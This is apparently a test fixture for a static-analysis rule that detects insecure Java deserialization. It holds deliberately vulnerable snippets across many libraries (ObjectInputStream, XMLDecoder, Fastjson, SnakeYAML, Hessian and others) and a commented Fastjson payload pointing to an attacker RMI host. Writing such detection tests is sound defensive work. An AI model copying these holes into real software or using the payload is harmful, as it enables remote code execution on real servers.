// EXAMPLE 1: ObjectInputStream - Deserialización nativa de Java
import java.io.*;
import java.util.Base64;

@RestController
public class SessionController {
    @PostMapping("/restore-session")
    public User restoreSession(@RequestParam String sessionData) 
            throws IOException, ClassNotFoundException {
        // Source: datos serializados del usuario en Base64
        byte[] data = Base64.getDecoder().decode(sessionData);
        
        // Sink: ObjectInputStream deserializa objetos arbitrarios
        ByteArrayInputStream bais = new ByteArrayInputStream(data);
        // ruleid: java-096-Insecure-Deserialization
        ObjectInputStream ois = new ObjectInputStream(bais);
        
        // Vulnerable: deserializa cualquier objeto Serializable
        User user = (User) ois.readObject();
        ois.close();
        
        return user;
    }
}

// EXAMPLE 2: XMLDecoder - Deserialización XML de Java Beans
import java.beans.XMLDecoder;
import java.io.ByteArrayInputStream;

@Service
public class ConfigurationService {
    public Object loadConfiguration(String xmlConfig) {
        // Source: XML del usuario
        ByteArrayInputStream bais = new ByteArrayInputStream(
            xmlConfig.getBytes()
        );
        
        // ruleid: java-096-Insecure-Deserialization
        XMLDecoder decoder = new XMLDecoder(bais);
        Object config = decoder.readObject();
        decoder.close();
        
        return config;
    }
}

// EXAMPLE 3: Deserializacion sin registro de clase
import com.esotericsoftware.kryo.Kryo;
import com.esotericsoftware.kryo.io.Input;

@Component
public class KryoDeserializer {
    private final Kryo kryo = new Kryo();
    
    public KryoDeserializer() {
        // Vulnerable: permite deserializar cualquier clase
        kryo.setRegistrationRequired(false);
    }
    
    public Object deserialize(byte[] data) {
        // Source: bytes del usuario
        Input input = new Input(data);
        
        // ruleid: java-096-Insecure-Deserialization
        Object obj = kryo.readClassAndObject(input);
        input.close();
        
        return obj;
    }
}

// EXAMPLE 4: Jackson con enableDefaultTyping
import com.fasterxml.jackson.databind.ObjectMapper;

@RestController
public class JsonController {
    
    ObjectMapper mapper = new ObjectMapper();
    mapper.enableDefaultTyping();
    
    @PostMapping("/process")
    public Object processJson(@RequestBody String json) 
            throws IOException {
        // ruleid: java-096-Insecure-Deserialization
        return mapper.readValue(json, Object.class);
    }
}

// EXAMPLE 5: Deserializacion XML sin restricciones
import com.thoughtworks.xstream.XStream;

@Service
public class XStreamService {
    private final XStream xstream = new XStream();
    
    public Object fromXml(String xml) {
        // Source: XML del usuario
        // ruleid: java-096-Insecure-Deserialization
        return xstream.fromXML(xml);
    }
}

// EXAMPLE 6: 
import org.yaml.snakeyaml.Yaml;

@Component
public class YamlProcessor {
    public Object parseYaml(String yamlContent) {
        // Source: YAML del usuario
        Yaml yaml = new Yaml();
        
        // Sink: SnakeYAML puede instanciar objetos arbitrarios
        // ruleid: java-096-Insecure-Deserialization
        return yaml.load(yamlContent);
    }
}

// EXAMPLE 6: 
import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;

@Service
public class FastjsonService {
    static {
        // Vulnerable: habilita autoType globalmente
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
    }
    
    public Object parseJson(String jsonStr) {
        // Source: JSON del usuario
        // todoruleid: java-096-Insecure-Deserialization
        return JSON.parse(jsonStr);
    }
}

/* Payload malicioso ejemplo:
{
    "@type":"com.sun.rowset.JdbcRowSetImpl",
    "dataSourceName":"rmi://attacker.com:1099/Exploit",
    "autoCommit":true
}
*/

// EXAMPLE 7: 
import com.google.gson.Gson;
import com.google.gson.reflect.TypeToken;
import java.lang.reflect.Type;

@RestController
public class GsonController {
    private final Gson gson = new Gson();
    
    @PostMapping("/deserialize")
    public Object deserialize(@RequestParam String className, 
                            @RequestBody String json) 
            throws ClassNotFoundException {
        // Source: nombre de clase del usuario
        Class<?> clazz = Class.forName(className);
        
        // Sink: Gson deserializa a la clase especificada
        // ruleid: java-096-Insecure-Deserialization
        Type type = TypeToken.get(clazz).getType();
        return gson.fromJson(json, type);
    }
}


import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

@Service
public class TransformerService {
    public Map processMap(byte[] serializedMap) 
            throws IOException, ClassNotFoundException {
        // Source: mapa serializado del usuario
        ByteArrayInputStream bais = new ByteArrayInputStream(serializedMap);
        // ruleid: java-096-Insecure-Deserialization
        ObjectInputStream ois = new ObjectInputStream(bais);
        
        // Sink: deserializa TransformedMap que puede contener InvokerTransformer
        // ruleid: java-096-Insecure-Deserialization
        Map map = (Map) ois.readObject();
        ois.close();
        
        return map;
    }
}

/* El gadget chain de Commons Collections usa InvokerTransformer
   para ejecutar métodos arbitrarios durante la deserialización */


import com.caucho.hessian.io.HessianInput;
import com.caucho.hessian.io.HessianOutput;

@Controller
public class HessianEndpoint {
    @PostMapping("/hessian")
    public void handleHessian(HttpServletRequest request, 
                             HttpServletResponse response) 
            throws IOException {
        // ruleid: java-096-Insecure-Deserialization
        HessianInput in = new HessianInput(request.getInputStream());
        
        // Sink: Hessian deserializa objetos arbitrarios
        Object obj = in.readObject();
        in.close();
        
        // Procesar objeto...
        processObject(obj);
        
        // Responder
        HessianOutput out = new HessianOutput(response.getOutputStream());
        out.writeObject("Processed");
        out.close();
    }
}


import org.jboss.marshalling.*;

@Component
public class JBossMarshallingService {
    public Object unmarshal(byte[] data) throws IOException, ClassNotFoundException {
        // Source: datos marshalled del usuario
        MarshallerFactory marshallerFactory = Marshalling.getProvidedMarshallerFactory("river");
        MarshallingConfiguration configuration = new MarshallingConfiguration();
        // ruleid: java-096-Insecure-Deserialization
        ByteInput input = Marshalling.createByteInput(new ByteArrayInputStream(data));
        Unmarshaller unmarshaller = marshallerFactory.createUnmarshaller(configuration);
        unmarshaller.start(input);
        
        // Sink: unmarshalling sin restricciones
        Object obj = unmarshaller.readObject();
        unmarshaller.finish();
        
        return obj;
    }
}

import java.rmi.*;
import java.rmi.server.*;

public interface RemoteService extends Remote {
    Object processObject(Object input) throws RemoteException;
}

public class RemoteServiceImpl extends UnicastRemoteObject implements RemoteService {
    
    protected RemoteServiceImpl() throws RemoteException {
        super();
    }
    
    @Override
    public Object processObject(Object input) throws RemoteException {
        // Source: objeto del cliente RMI
        // Sink: RMI deserializa automáticamente el objeto
        
        // El objeto ya fue deserializado por RMI al llegar aquí
        // Si el objeto es malicioso, el código ya se ejecutó
        
        return "Processed: " + input.toString();
    }
}

// FP1
    public static RequestContextType getRequestContextFromEvent(Map<String, Object> event) throws ClassCastException, NullPointerException {
        RequestContextType requestContext = new RequestContextType();

        @SuppressWarnings("unchecked")
        // ok: java-096-Insecure-Deserialization
        Map<String, Object> requestContextClaim = (Map<String, Object>) event.get("requestContext");

        requestContext.setAccountId(requestContextClaim.get("accountId").toString());
        requestContext.setApiId(requestContextClaim.get("apiId").toString());
        requestContext.setApiKey(requestContextClaim.get("apiKey").toString());
        requestContext.setDomainName(requestContextClaim.get("domainName").toString());
        requestContext.setHttpMethod(requestContextClaim.get("httpMethod").toString());
        requestContext.setPath(requestContextClaim.get("path").toString());
        requestContext.setProtocol(requestContextClaim.get("protocol").toString());
        requestContext.setRequestId(requestContextClaim.get("requestId").toString());
        requestContext.setRequestTime(requestContextClaim.get("requestTime").toString());
        requestContext.setResourceId(requestContextClaim.get("resourceId").toString());
        requestContext.setResourcePath(requestContextClaim.get("resourcePath").toString());
        requestContext.setSourceIp(requestContextClaim.get("sourceIp").toString());
        requestContext.setStage(requestContextClaim.get("stage").toString());
        requestContext.setUserAgent(requestContextClaim.get("userAgent").toString());
        requestContext.setRequestTimeEpoch(Long.parseLong(requestContextClaim.get("requestTimeEpoch").toString()));

        return requestContext;

    }
